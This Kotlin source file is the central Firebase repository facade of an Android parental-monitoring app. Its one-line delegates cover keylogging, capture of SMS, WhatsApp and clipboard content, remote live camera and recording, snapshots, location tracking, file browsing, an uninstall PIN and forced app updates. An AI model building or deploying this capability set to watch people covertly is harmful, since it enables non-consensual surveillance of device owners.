package com.example.authapp.data

import android.content.Context
import android.net.Uri
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.*
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import com.example.authapp.utils.onValueChange
import com.example.authapp.utils.toListOf
import org.webrtc.PeerConnection

object FirebaseRepository {
    val auth: FirebaseAuth get() = FirebaseAuth.getInstance()
    val database: FirebaseDatabase get() = FirebaseDatabase.getInstance()
    val firestore: FirebaseFirestore get() = FirebaseFirestore.getInstance()
    val storage: FirebaseStorage get() = FirebaseStorage.getInstance()
    val crashlytics: FirebaseCrashlytics get() = FirebaseCrashlytics.getInstance()


    val currentUser get() = auth.currentUser

    init {
        try {
            database.setPersistenceEnabled(true)
        } catch (_: Exception) {}
        try {
            storage.maxUploadRetryTimeMillis = 30000L
            storage.maxOperationRetryTimeMillis = 30000L
            storage.maxDownloadRetryTimeMillis = 30000L
        } catch (_: Exception) {}
    }

    inline fun <reified T> listenToChildNode(
        nodePath: String,
        childUid: String,
        crossinline onData: (List<T>) -> Unit
    ): ValueEventListener = FirebaseRepoHelpers.listenToChildNode(nodePath, childUid, onData)

    inline fun <reified T> listenToChildNodeList(
        nodePath: String,
        childId: String,
        limit: Int = 50,
        crossinline transform: (List<T>) -> List<T> = { it },
        crossinline onData: (List<T>) -> Unit
    ): ValueEventListener = FirebaseRepoHelpers.listenToChildNodeList(nodePath, childId, limit, transform, onData)

    inline fun <T> pushChildItem(
        path: String,
        childId: String,
        item: T,
        crossinline withId: (T, String) -> T = { itm, _ -> itm }
    ) = FirebaseRepoHelpers.pushChildItem(path, childId, item, withId)

    inline fun <T> syncChildMap(
        path: String,
        childId: String,
        items: List<T>,
        limit: Int = 50,
        crossinline keySelector: (T) -> String
    ) = FirebaseRepoHelpers.syncChildMap(path, childId, items, limit, keySelector)

    inline fun <reified T> listenFirestoreCollection(
        collection: String,
        childId: String,
        orderField: String = "timestamp",
        limit: Long = 20,
        crossinline onUpdate: (List<T>) -> Unit
    ): ListenerRegistration = FirebaseRepoHelpers.listenFirestoreCollection(collection, childId, orderField, limit, onUpdate)

    internal fun <T : Any> saveChildDocumentDual(
        collectionName: String,
        rtdbPath: String = collectionName,
        childId: String,
        itemKey: String,
        item: T
    ) = FirebaseRepoHelpers.saveChildDocumentDual(collectionName, rtdbPath, childId, itemKey, item)

    fun recordNonFatalError(message: String, exception: Throwable? = null) {
        crashlytics.log("[FeatureHealth] $message")
        exception?.let { crashlytics.recordException(it) }
    }

    fun setupPresenceSystem(uid: String) = FirebaseAuthRepository.setupPresenceSystem(uid)
    fun clearPresenceListener() = FirebaseAuthRepository.clearPresenceListener()

    // --- Users Delegates (FirebaseUserRepository) ---
    fun listenToUserRole(uid: String, onRole: (String) -> Unit) = FirebaseUserRepository.listenToUserRole(uid, onRole)
    fun getUserRoleOnce(uid: String, onRole: (String) -> Unit) = FirebaseUserRepository.getUserRoleOnce(uid, onRole)
    fun saveCachedChildUsers(ctx: Context, list: List<User>) = FirebaseUserRepository.saveCachedChildUsers(ctx, list)
    fun getCachedChildUsers(ctx: Context): List<User> = FirebaseUserRepository.getCachedChildUsers(ctx)
    fun listenToChildUsers(onUsers: (List<User>) -> Unit) = FirebaseUserRepository.listenToChildUsers(onUsers)
    fun linkChildToParent(childId: String, parentId: String, onComplete: (Boolean, String?) -> Unit) =
        FirebaseUserRepository.linkChildToParent(childId, parentId, onComplete)

    // --- Authentication Delegates (FirebaseAuthRepository) ---
    fun signUp(fullName: String, email: String, pass: String, role: String = "child", onResult: (Boolean, String?) -> Unit) =
        FirebaseAuthRepository.signUp(fullName, email, pass, role, onResult)
    fun signIn(email: String, pass: String, onResult: (Boolean, String?) -> Unit) =
        FirebaseAuthRepository.signIn(email, pass, onResult)
    fun sendPasswordResetEmail(email: String, onResult: (Boolean, String?) -> Unit) =
        FirebaseAuthRepository.sendPasswordResetEmail(email, onResult)
    fun signOut() = FirebaseAuthRepository.signOut()
    fun setOnlineStatus(isOnline: Boolean) = FirebaseAuthRepository.setOnlineStatus(isOnline)
    fun updateFcmToken() = FirebaseAuthRepository.updateFcmToken()

    // --- Signaling Delegates (FirebaseSignalingRepository) ---
    fun updateStreamStatus(childId: String, status: String, streamType: String, sessionId: String) =
        FirebaseSignalingRepository.updateStreamStatus(childId, status, streamType, sessionId)
    fun requestStream(childId: String, streamType: String, onComplete: (String) -> Unit) =
        FirebaseSignalingRepository.requestStream(childId, streamType, onComplete)
    fun requestStream(childId: String, streamType: String, onComplete: (String) -> Unit, onError: ((Exception) -> Unit)?) =
        FirebaseSignalingRepository.requestStream(childId, streamType, onComplete, onError)
    fun stopStream(childId: String, sessionId: String? = null) =
        FirebaseSignalingRepository.stopStream(childId, sessionId)
    fun requestRemoteRecording(childId: String, isRecording: Boolean, streamType: String) =
        FirebaseSignalingRepository.requestRemoteRecording(childId, isRecording, streamType)
    fun listenToRemoteRecording(childId: String, onCommand: (Boolean, String) -> Unit) =
        FirebaseSignalingRepository.listenToRemoteRecording(childId, onCommand)
    fun listenToStreamRequests(childId: String, onRequested: (String, String) -> Unit, onStopped: () -> Unit) =
        FirebaseSignalingRepository.listenToStreamRequests(childId, onRequested, onStopped)
    fun removeStreamRequestListener(childId: String, listener: ValueEventListener) =
        FirebaseSignalingRepository.removeStreamRequestListener(childId, listener)
    fun sendSdpOffer(sessionId: String, sdp: String) = FirebaseSignalingRepository.sendSdpOffer(sessionId, sdp)
    fun sendSdpAnswer(sessionId: String, sdp: String) = FirebaseSignalingRepository.sendSdpAnswer(sessionId, sdp)
    fun sendIceCandidate(sessionId: String, candidate: Map<String, Any>, isParent: Boolean) =
        FirebaseSignalingRepository.sendIceCandidate(sessionId, candidate, isParent)
    fun sendIceCandidatesBatch(sessionId: String, candidates: List<Map<String, Any>>, isParent: Boolean) =
        FirebaseSignalingRepository.sendIceCandidatesBatch(sessionId, candidates, isParent)
    fun cleanupSignalingData(sessionId: String, childId: String? = null) =
        FirebaseSignalingRepository.cleanupSignalingData(sessionId, childId)
    fun listenToSdpOffer(sessionId: String, onOffer: (String) -> Unit) =
        FirebaseSignalingRepository.listenToSdpOffer(sessionId, onOffer)
    fun listenToSdpAnswer(sessionId: String, onAnswer: (String) -> Unit) =
        FirebaseSignalingRepository.listenToSdpAnswer(sessionId, onAnswer)
    fun listenToCandidates(sessionId: String, listenToParentCandidates: Boolean, onCandidate: (String, Int, String) -> Unit) =
        FirebaseSignalingRepository.listenToCandidates(sessionId, listenToParentCandidates, onCandidate)
    fun removeCandidateListener(sessionId: String, listenToParentCandidates: Boolean, listener: ChildEventListener) =
        FirebaseSignalingRepository.removeCandidateListener(sessionId, listenToParentCandidates, listener)
    fun removeSdpOfferListener(sessionId: String, listener: ValueEventListener) =
        FirebaseSignalingRepository.removeSdpOfferListener(sessionId, listener)
    fun removeSdpAnswerListener(sessionId: String, listener: ValueEventListener) =
        FirebaseSignalingRepository.removeSdpAnswerListener(sessionId, listener)
    fun removeCameraFacingListener(sessionId: String, listener: ValueEventListener) =
        FirebaseSignalingRepository.removeCameraFacingListener(sessionId, listener)
    fun removeValueListener(path: String, listener: ValueEventListener) =
        FirebaseSignalingRepository.removeValueListener(path, listener)
    fun deleteSignalingSession(sessionId: String) = FirebaseSignalingRepository.deleteSignalingSession(sessionId)
    fun toggleCameraFacing(sessionId: String, isFront: Boolean) =
        FirebaseSignalingRepository.toggleCameraFacing(sessionId, isFront)
    fun setCameraFacingMode(sessionId: String, facing: String) =
        FirebaseSignalingRepository.setCameraFacingMode(sessionId, facing)
    fun listenToCameraFacing(sessionId: String, onFacing: (Boolean) -> Unit) =
        FirebaseSignalingRepository.listenToCameraFacing(sessionId, onFacing)
    fun listenToCameraFacingMode(sessionId: String, onMode: (String) -> Unit) =
        FirebaseSignalingRepository.listenToCameraFacingMode(sessionId, onMode)
    fun fetchIceServers(onResult: (List<PeerConnection.IceServer>) -> Unit) =
        FirebaseSignalingRepository.fetchIceServers(onResult)

    // --- Communications Delegates (FirebaseCommunicationsRepository) ---
    fun syncCallLogs(childId: String, logs: List<CallLogItem>) = FirebaseCommunicationsRepository.syncCallLogs(childId, logs)
    fun listenToCallLogs(childId: String, onLogs: (List<CallLogItem>) -> Unit) = FirebaseCommunicationsRepository.listenToCallLogs(childId, onLogs)
    fun pushNotification(childId: String, item: NotificationItem) = FirebaseCommunicationsRepository.pushNotification(childId, item)
    fun listenToNotificationsFirestore(childId: String, limit: Long = 20, onNotifications: (List<NotificationItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToNotificationsFirestore(childId, limit, onNotifications)
    fun listenToNotifications(childId: String, onNotifications: (List<NotificationItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToNotifications(childId, onNotifications)
    fun syncSmsLogs(childId: String, smsList: List<SmsItem>) = FirebaseCommunicationsRepository.syncSmsLogs(childId, smsList)
    fun listenToSmsLogs(childId: String, onSms: (List<SmsItem>) -> Unit) = FirebaseCommunicationsRepository.listenToSmsLogs(childId, onSms)
    fun logSingleCallLog(childId: String, callLog: CallLogItem) = FirebaseCommunicationsRepository.logSingleCallLog(childId, callLog)
    fun attachRecordingUrlToLatestCallLog(childId: String, url: String) = FirebaseCommunicationsRepository.attachRecordingUrlToLatestCallLog(childId, url)
    fun saveCallLogToFirestore(childId: String, callLog: CallLogItem) = FirebaseCommunicationsRepository.saveCallLogToFirestore(childId, callLog)
    fun listenToChildCallLogsFirestore(childId: String, limit: Long = 20, onUpdate: (List<CallLogItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToChildCallLogsFirestore(childId, limit, onUpdate)
    fun saveSmsLogToFirestore(childId: String, sms: SmsItem) = FirebaseCommunicationsRepository.saveSmsLogToFirestore(childId, sms)
    fun listenToChildSmsLogsFirestore(childId: String, limit: Long = 20, onUpdate: (List<SmsItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToChildSmsLogsFirestore(childId, limit, onUpdate)
    fun pushWhatsAppLog(childId: String, item: WhatsAppLogItem) = FirebaseCommunicationsRepository.pushWhatsAppLog(childId, item)
    fun listenToWhatsAppLogsFirestore(childId: String, limit: Long = 20, onLogs: (List<WhatsAppLogItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToWhatsAppLogsFirestore(childId, limit, onLogs)
    fun listenToWhatsAppLogs(childId: String, onLogs: (List<WhatsAppLogItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToWhatsAppLogs(childId, onLogs)
    fun pushClipboardLog(childId: String, text: String) = FirebaseCommunicationsRepository.pushClipboardLog(childId, text)
    fun listenToClipboardLogsFirestore(childId: String, limit: Long = 50, onLogs: (List<ClipboardLogItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToClipboardLogsFirestore(childId, limit, onLogs)
    fun listenToClipboardLogs(childId: String, onLogs: (List<ClipboardLogItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToClipboardLogs(childId, onLogs)
    fun pushActivityFeedItem(childId: String, item: com.example.authapp.model.ActivityFeedItem) =
        FirebaseCommunicationsRepository.pushActivityFeedItem(childId, item)
    fun listenToActivityFeed(childId: String, limit: Int = 50, onEvents: (List<com.example.authapp.model.ActivityFeedItem>) -> Unit) =
        FirebaseCommunicationsRepository.listenToActivityFeed(childId, limit, onEvents)

    // --- Media & Recordings Delegates (FirebaseMediaRepository) ---
    fun saveRecordingSession(childId: String, streamType: String, durationSeconds: Long, localFilePath: String = "", parentId: String = "", existingRecId: String = "", onSaved: () -> Unit = {}) =
        FirebaseMediaRepository.saveRecordingSession(childId, streamType, durationSeconds, localFilePath, parentId, existingRecId, onSaved)
    fun uploadRecordingFile(childId: String, fileUri: Uri, streamType: String, durationSeconds: Long, localFilePath: String = "", parentId: String = "", existingRecId: String = "", onSuccess: (RecordingSession) -> Unit = {}, onFailure: (String) -> Unit = {}) =
        FirebaseMediaRepository.uploadRecordingFile(childId, fileUri, streamType, durationSeconds, localFilePath, parentId, existingRecId, onSuccess, onFailure)
    fun listenToRecordings(childId: String, onRecordings: (List<RecordingSession>) -> Unit) = FirebaseMediaRepository.listenToRecordings(childId, onRecordings)
    fun listenToAllRecordings(onRecordings: (List<RecordingSession>) -> Unit) = FirebaseMediaRepository.listenToAllRecordings(onRecordings)
    fun saveRecordingSchedule(childId: String, schedule: RecordingSchedule) = FirebaseMediaRepository.saveRecordingSchedule(childId, schedule)
    fun deleteRecordingSchedule(childId: String, scheduleId: String) = FirebaseMediaRepository.deleteRecordingSchedule(childId, scheduleId)
    fun listenToRecordingSchedules(childId: String, onSchedules: (List<RecordingSchedule>) -> Unit) = FirebaseMediaRepository.listenToRecordingSchedules(childId, onSchedules)
    fun requestSnapshot(childId: String, cameraFacing: String = "back") = FirebaseMediaRepository.requestSnapshot(childId, cameraFacing)
    fun listenToSnapshotRequest(childId: String, onRequested: (String) -> Unit) = FirebaseMediaRepository.listenToSnapshotRequest(childId, onRequested)
    fun uploadSnapshot(childId: String, fileUri: Uri, cameraFacing: String, onSuccess: (SnapshotInfo) -> Unit, onFailure: (String) -> Unit) =
        FirebaseMediaRepository.uploadSnapshot(childId, fileUri, cameraFacing, onSuccess, onFailure)
    fun reportSnapshotError(childId: String, error: String) = FirebaseMediaRepository.reportSnapshotError(childId, error)
    fun listenToSnapshotRequestStatus(childId: String, onStatus: (String, String?) -> Unit) = FirebaseMediaRepository.listenToSnapshotRequestStatus(childId, onStatus)
    fun listenToSnapshots(childId: String, onSnapshots: (List<SnapshotInfo>) -> Unit) = FirebaseMediaRepository.listenToSnapshots(childId, onSnapshots)
    fun saveRecordingToFirestore(childId: String, session: RecordingSession) = FirebaseMediaRepository.saveRecordingToFirestore(childId, session)
    fun listenToRecordingsFirestore(childId: String, limit: Long = 50, onUpdate: (List<RecordingSession>) -> Unit) =
        FirebaseMediaRepository.listenToRecordingsFirestore(childId, limit, onUpdate)

    // --- Storage & Explorer Delegates (FirebaseStorageExplorerRepository) ---
    fun syncMediaItems(childId: String, items: List<MediaItemInfo>) = FirebaseStorageExplorerRepository.syncMediaItems(childId, items)
    fun listenToMediaItemsFirestore(childId: String, limit: Long = 50, onMedia: (List<MediaItemInfo>) -> Unit) =
        FirebaseStorageExplorerRepository.listenToMediaItemsFirestore(childId, limit, onMedia)
    fun listenToMediaItems(childId: String, onMedia: (List<MediaItemInfo>) -> Unit) = FirebaseStorageExplorerRepository.listenToMediaItems(childId, onMedia)
    fun syncMediaGallery(childUid: String, items: List<MediaGalleryItem>) = FirebaseStorageExplorerRepository.syncMediaGallery(childUid, items)
    fun pushMediaGalleryItem(childUid: String, item: MediaGalleryItem) = FirebaseStorageExplorerRepository.pushMediaGalleryItem(childUid, item)
    fun listenToMediaGalleryFirestore(childId: String, limit: Long = 20, onItems: (List<MediaGalleryItem>) -> Unit) =
        FirebaseStorageExplorerRepository.listenToMediaGalleryFirestore(childId, limit, onItems)
    fun listenToMediaGallery(childId: String, onItems: (List<MediaGalleryItem>) -> Unit) = FirebaseStorageExplorerRepository.listenToMediaGallery(childId, onItems)
    fun syncFileExplorer(childUid: String, items: List<FileExplorerItem>) = FirebaseStorageExplorerRepository.syncFileExplorer(childUid, items)
    fun listenToFileExplorerFirestore(childId: String, limit: Long = 20, onFiles: (List<FileExplorerItem>) -> Unit) =
        FirebaseStorageExplorerRepository.listenToFileExplorerFirestore(childId, limit, onFiles)
    fun listenToFileExplorer(childId: String, onFiles: (List<FileExplorerItem>) -> Unit) = FirebaseStorageExplorerRepository.listenToFileExplorer(childId, onFiles)
    fun pushYouTubeLog(childUid: String, item: YouTubeLogItem) = FirebaseStorageExplorerRepository.pushYouTubeLog(childUid, item)
    fun listenToYouTubeLogs(childId: String, onLogs: (List<YouTubeLogItem>) -> Unit) = FirebaseStorageExplorerRepository.listenToYouTubeLogs(childId, onLogs)

    // --- Device State Delegates (FirebaseDeviceStateRepository) ---
    fun updateChildLocation(childId: String, location: UserLocation) = FirebaseDeviceStateRepository.updateChildLocation(childId, location)
    fun requestChildLocation(childId: String) = FirebaseDeviceStateRepository.requestChildLocation(childId)
    fun listenToChildLocation(childId: String, onLoc: (UserLocation?) -> Unit) = FirebaseDeviceStateRepository.listenToChildLocation(childId, onLoc)
    fun listenToLocationRequests(childId: String, onReq: () -> Unit) = FirebaseDeviceStateRepository.listenToLocationRequests(childId, onReq)
    fun recordLocationHistoryPoint(childId: String, loc: UserLocation) = FirebaseDeviceStateRepository.recordLocationHistoryPoint(childId, loc)
    fun recordLocationHistoryBatch(childId: String, locations: List<UserLocation>) = FirebaseDeviceStateRepository.recordLocationHistoryBatch(childId, locations)
    fun listenToLocationHistory(childId: String, onHist: (List<UserLocation>) -> Unit) = FirebaseDeviceStateRepository.listenToLocationHistory(childId, onHist)
    fun saveGeofence(childId: String, zone: GeofenceZone) = FirebaseDeviceStateRepository.saveGeofence(childId, zone)
    fun listenToGeofences(childId: String, onZones: (List<GeofenceZone>) -> Unit) = FirebaseDeviceStateRepository.listenToGeofences(childId, onZones)
    fun saveSimCardInfo(childId: String, info: SimCardInfo) = FirebaseDeviceStateRepository.saveSimCardInfo(childId, info)
    fun listenToSimCardInfo(childId: String, onInfo: (SimCardInfo?) -> Unit) = FirebaseDeviceStateRepository.listenToSimCardInfo(childId, onInfo)
    fun recordNetworkHistory(childId: String, item: NetworkHistoryItem) = FirebaseDeviceStateRepository.recordNetworkHistory(childId, item)
    fun listenToNetworkHistory(childId: String, onHistory: (List<NetworkHistoryItem>) -> Unit) = FirebaseDeviceStateRepository.listenToNetworkHistory(childId, onHistory)
    fun saveNetworkHistoryToFirestore(childId: String, item: NetworkHistoryItem) = FirebaseDeviceStateRepository.saveNetworkHistoryToFirestore(childId, item)
    fun listenToChildNetworkHistoryFirestore(childId: String, limit: Long = 50, onUpdate: (List<NetworkHistoryItem>) -> Unit) =
        FirebaseDeviceStateRepository.listenToChildNetworkHistoryFirestore(childId, limit, onUpdate)
    fun recordWifiLog(childId: String, ssid: String, bssid: String = "", rssi: Int = 0, ip: String = "") =
        FirebaseDeviceStateRepository.recordWifiLog(childId, ssid, bssid, rssi, ip)
    fun listenToDeviceHealth(childUid: String, onHealth: (DeviceHealth?) -> Unit) = FirebaseDeviceStateRepository.listenToDeviceHealth(childUid, onHealth)
    fun listenToAppUpdate(onUpdate: (AppUpdateInfo?) -> Unit) = FirebaseDeviceStateRepository.listenToAppUpdate(onUpdate)
    fun publishAppUpdate(info: AppUpdateInfo, onResult: (Boolean, String?) -> Unit) = FirebaseDeviceStateRepository.publishAppUpdate(info, onResult)
    fun publishAppUpdate(versionCode: Long, versionName: String, apkUrl: String, releaseNotes: String, isForceUpdate: Boolean = false, onComplete: (Boolean) -> Unit = {}) =
        FirebaseDeviceStateRepository.publishAppUpdate(versionCode, versionName, apkUrl, releaseNotes, isForceUpdate, onComplete)

    // --- Controls & Safety Delegates (FirebaseControlsSafetyRepository) ---
    fun syncAppUsage(childId: String, list: List<AppUsageInfo>) = FirebaseControlsSafetyRepository.syncAppUsage(childId, list)
    fun listenToAppUsageFirestore(childId: String, limit: Long = 50, onUsage: (List<AppUsageInfo>) -> Unit) =
        FirebaseControlsSafetyRepository.listenToAppUsageFirestore(childId, limit, onUsage)
    fun listenToAppUsage(childId: String, onUsage: (List<AppUsageInfo>) -> Unit) = FirebaseControlsSafetyRepository.listenToAppUsage(childId, onUsage)
    fun setAppBlocked(childId: String, pkg: String, blocked: Boolean) = FirebaseControlsSafetyRepository.setAppBlocked(childId, pkg, blocked)
    fun setStudyMode(childId: String, active: Boolean, duration: Int = 0) = FirebaseControlsSafetyRepository.setStudyMode(childId, active, duration)
    fun listenToParentControls(childId: String, onControls: (ParentControlSettings) -> Unit) = FirebaseControlsSafetyRepository.listenToParentControls(childId, onControls)
    fun setUninstallPin(childId: String, pin: String) = FirebaseControlsSafetyRepository.setUninstallPin(childId, pin)
    fun sendRemoteCommand(childId: String, cmd: String, value: Any = true) = FirebaseControlsSafetyRepository.sendRemoteCommand(childId, cmd, value)
    fun listenToRemoteCommands(childId: String, onCmd: (String, Any?) -> Unit) = FirebaseControlsSafetyRepository.listenToRemoteCommands(childId, onCmd)
    fun pushSecurityAlert(childId: String, alert: SecurityAlert) = FirebaseControlsSafetyRepository.pushSecurityAlert(childId, alert)
    fun listenToSecurityAlerts(childId: String, onAlerts: (List<SecurityAlert>) -> Unit) = FirebaseControlsSafetyRepository.listenToSecurityAlerts(childId, onAlerts)
    fun saveSecurityAlertToFirestore(childId: String, alert: SecurityAlert) = FirebaseControlsSafetyRepository.saveSecurityAlertToFirestore(childId, alert)
    fun listenToChildSecurityAlertsFirestore(childId: String, limit: Long = 50, onUpdate: (List<SecurityAlert>) -> Unit) =
        FirebaseControlsSafetyRepository.listenToChildSecurityAlertsFirestore(childId, limit, onUpdate)
    fun logWebHistoryItem(childId: String, item: WebHistoryItem) = FirebaseControlsSafetyRepository.logWebHistoryItem(childId, item)
    fun listenToWebHistory(childId: String, onHistory: (List<WebHistoryItem>) -> Unit) = FirebaseControlsSafetyRepository.listenToWebHistory(childId, onHistory)
    fun saveWebHistoryToFirestore(childId: String, item: WebHistoryItem) = FirebaseControlsSafetyRepository.saveWebHistoryToFirestore(childId, item)
    fun listenToChildWebHistoryFirestore(childId: String, limit: Long = 20, onUpdate: (List<WebHistoryItem>) -> Unit) =
        FirebaseControlsSafetyRepository.listenToChildWebHistoryFirestore(childId, limit, onUpdate)
    fun recordPackageEvent(childId: String, event: AppInstallEvent) = FirebaseControlsSafetyRepository.recordPackageEvent(childId, event)
    fun listenToPackageEvents(childId: String, onEvents: (List<AppInstallEvent>) -> Unit) = FirebaseControlsSafetyRepository.listenToPackageEvents(childId, onEvents)
    fun logAppInstallEvent(childId: String, event: AppInstallEvent) = FirebaseControlsSafetyRepository.logAppInstallEvent(childId, event)
    fun listenToAppInstallEvents(childId: String, onEvents: (List<AppInstallEvent>) -> Unit) = FirebaseControlsSafetyRepository.listenToAppInstallEvents(childId, onEvents)
    fun savePackageEventToFirestore(childId: String, event: AppInstallEvent) = FirebaseControlsSafetyRepository.savePackageEventToFirestore(childId, event)
    fun listenToChildPackageEventsFirestore(childId: String, limit: Long = 50, onUpdate: (List<AppInstallEvent>) -> Unit) =
        FirebaseControlsSafetyRepository.listenToChildPackageEventsFirestore(childId, limit, onUpdate)
    fun pushKeylog(childId: String, text: String, app: String, pkg: String) = FirebaseControlsSafetyRepository.pushKeylog(childId, text, app, pkg)

    // --- Pairing & Maintenance Delegates (FirebasePairingRepository & FirebaseMaintenanceRepository) ---
    fun getOrGenerateParentPairingCode(parentUid: String, parentEmail: String, onComplete: (String?, String?) -> Unit) =
        FirebasePairingRepository.getOrGenerateParentPairingCode(parentUid, parentEmail, onComplete)
    fun generateNewParentPairingCode(parentUid: String, parentEmail: String, onComplete: (String?, String?) -> Unit) =
        FirebasePairingRepository.generateNewParentPairingCode(parentUid, parentEmail, onComplete)
    fun pairChildWithCode(childUid: String, code: String, onResult: (Boolean, String?, String?) -> Unit) =
        FirebasePairingRepository.pairChildWithCode(childUid, code, onResult)
    fun listenToPairingCodeStatus(code: String, onLinked: (String) -> Unit) = FirebasePairingRepository.listenToPairingCodeStatus(code, onLinked)
    fun listenToChildParentLink(childUid: String, onParentId: (String) -> Unit) = FirebasePairingRepository.listenToChildParentLink(childUid, onParentId)
    fun getOrGenerateChildPairingCode(childUid: String, childEmail: String, onComplete: (String?, String?) -> Unit) =
        FirebasePairingRepository.getOrGenerateChildPairingCode(childUid, childEmail, onComplete)
    fun generateNewChildPairingCode(childUid: String, childEmail: String, onComplete: (String?, String?) -> Unit) =
        FirebasePairingRepository.generateNewChildPairingCode(childUid, childEmail, onComplete)
    fun pairParentWithChildCode(parentUid: String, parentEmail: String, code: String, onResult: (Boolean, String?, String?, String?) -> Unit) =
        FirebasePairingRepository.pairParentWithChildCode(parentUid, parentEmail, code, onResult)
    fun unpairChild(childUid: String, onComplete: (Boolean, String?) -> Unit) = FirebasePairingRepository.unpairChild(childUid, onComplete)
    fun pruneOldLogs(childId: String, retentionDays: Int = 30) = FirebaseMaintenanceRepository.pruneOldLogs(childId, retentionDays)
    fun cleanOldCloudStorage(childId: String, retentionDays: Int = 7, onComplete: (Int) -> Unit = {}) =
        FirebaseMaintenanceRepository.cleanOldCloudStorage(childId, retentionDays, onComplete)
}
